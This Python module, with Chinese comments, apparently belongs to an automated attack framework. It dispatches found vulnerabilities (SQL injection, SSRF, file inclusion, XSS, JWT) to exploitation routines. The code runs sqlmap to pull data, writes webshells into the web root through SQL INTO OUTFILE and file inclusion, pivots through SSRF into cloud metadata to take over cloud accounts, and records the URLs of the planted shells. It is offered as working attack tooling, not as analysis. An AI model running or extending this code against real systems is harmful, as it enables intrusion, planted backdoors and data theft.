"""Per-vtype 武器化分派 (从 Orchestrator.phase_weaponize 内嵌函数抽出).

原实现是 phase_weaponize 内一个 105 行的嵌套函数 _weaponize_one,
vtype 用 if 链分派. 抽出后:
- 每个 vtype 一个独立函数, 可单独单测
- 便于新增 vtype (加个函数 + 注册表)
- 消除嵌套 nonlocal webshell_urls 的隐式状态传递
"""
from __future__ import annotations

import json
import logging
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


def weaponize_sqli(url: str, param: str, sess: Any, timeout: float,
                   vuln_ctx: Any, webshell_urls: List[str]) -> Dict:
    from tools import sqli_weaponizer

    result: Dict[str, Any] = {}
    try:
        result["sqli_weaponizer"] = sqli_weaponizer.check(url, param, sess, timeout)
    except Exception as e:
        logger.debug("sqli weaponize sqli_weaponizer: %s", e)
    if (result.get("sqli_weaponizer", {}).get("vulnerable")
            or result.get("sqli_weaponizer", {}).get("data_extracted")):
        result["exploit_ready"] = True

    from tools.kali_executor import is_available as kali_avail
    if kali_avail():
        try:
            from tools import kali_toolset
            sqlmap_r = kali_toolset.sqlmap_detect(url, param)
            if sqlmap_r.get("vulnerable") or sqlmap_r.get("data"):
                result["sqlmap"] = sqlmap_r
                result["exploit_ready"] = True
                if sqlmap_r.get("data"):
                    result["extracted_data"] = sqlmap_r["data"]
        except Exception as e:
            logger.debug("sqlmap weaponize: %s", e)

    from tools.weaponize_engine import sqli_into_outfile
    web_root = vuln_ctx.get().discovered_versions.get("web_root", "/var/www/html")
    sqli_shell = sqli_into_outfile(url, param, sess, timeout, web_root)
    if sqli_shell.get("success"):
        result["sqli_webshell"] = sqli_shell
        result["exploit_ready"] = True
        if sqli_shell.get("webshell_url"):
            webshell_urls.append(sqli_shell["webshell_url"])
    return result


def weaponize_ssrf(url: str, param: str, sess: Any, timeout: float) -> Dict:
    from tools import ssrf_pwn as ssrf_lateral

    result: Dict[str, Any] = {}
    try:
        lat = ssrf_lateral.run(url, param, sess=sess, timeout=timeout)
        result["ssrf_lateral"] = lat
        result["ssrf_pwn"] = ssrf_lateral.check(url, param, sess=sess, timeout=timeout)
        cloud_meta = lat.get("cloud_metadata", {})
        if cloud_meta:
            from tools.cloud_pwn import check as cloud_check
            c_result = cloud_check(json.dumps(cloud_meta))
            if c_result.get("success"):
                result["cloud_pwn"] = c_result
                result["exploit_ready"] = True
    except Exception as e:
        logger.debug("ssrf weaponize: %s", e)
    return result


def weaponize_lfi(url: str, param: str, sess: Any, timeout: float,
                  finding: Dict) -> Dict:
    result: Dict[str, Any] = {}
    v = finding.get("result", {})
    if v.get("rce_available"):
        result["rce"] = True
        result["exploit_ready"] = True
        try:
            from tools.reverse_shell import deploy_webshell
            ws = deploy_webshell(url, webshell_type="php_cmd", sess=sess, timeout=timeout)
            if ws.get("success"):
                result["webshell"] = ws
        except Exception as e:
            logger.debug("webshell deploy: %s", e)

    from tools.weaponize_engine import deploy_webshell_lfi
    lfi_ws = deploy_webshell_lfi(url, param, sess, timeout)
    if lfi_ws.get("success"):
        result["lfi_webshell"] = lfi_ws
        result["exploit_ready"] = True
        result["webshell"] = result.get("webshell", {})
        result["webshell"]["lfi_auto"] = lfi_ws
    return result


def weaponize_xss(url: str, param: str, sess: Any, timeout: float) -> Dict:
    from tools import xss_validator

    result: Dict[str, Any] = {}
    try:
        result["xss_validated"] = xss_validator.check(url, param, sess, timeout)
    except Exception as e:
        logger.debug("xss validate: %s", e)
    return result


def weaponize_jwt(finding: Dict, url: str, param: str,
                  sess: Any, timeout: float) -> Dict:
    from tools import jwt_exploiter

    result: Dict[str, Any] = {}
    tokens = finding.get("result", {}).get("tokens_found", [])
    for token_entry in tokens:
        token_str = token_entry.get("token", "")
        if token_str:
            try:
                result["jwt_exploit"] = jwt_exploiter.check(
                    token=token_str, sess=sess, url=url, param=param, timeout=timeout)
            except Exception as e:
                logger.debug("jwt exploit: %s", e)
    if not result:
        try:
            result["jwt_none_test"] = jwt_exploiter.check(
                token=None, sess=sess, url=url, param=param, timeout=timeout)
        except Exception as e:
            logger.debug("jwt none test: %s", e)
    return result


def weaponize_one(finding: Dict, sess: Any, timeout: float,
                  vuln_ctx: Any, webshell_urls: List[str]) -> Optional[Dict]:
    """按 vtype 分派武器化. 无对应武器化时返回 None."""
    vtype = finding["type"]
    url = finding["url"]
    param = finding["param"]

    if vtype == "sqli":
        result = weaponize_sqli(url, param, sess, timeout, vuln_ctx, webshell_urls)
    elif vtype == "ssrf":
        result = weaponize_ssrf(url, param, sess, timeout)
    elif vtype == "lfi":
        result = weaponize_lfi(url, param, sess, timeout, finding)
    elif vtype == "xss":
        result = weaponize_xss(url, param, sess, timeout)
    elif vtype == "jwt":
        result = weaponize_jwt(finding, url, param, sess, timeout)
    else:
        return None

    return result or None
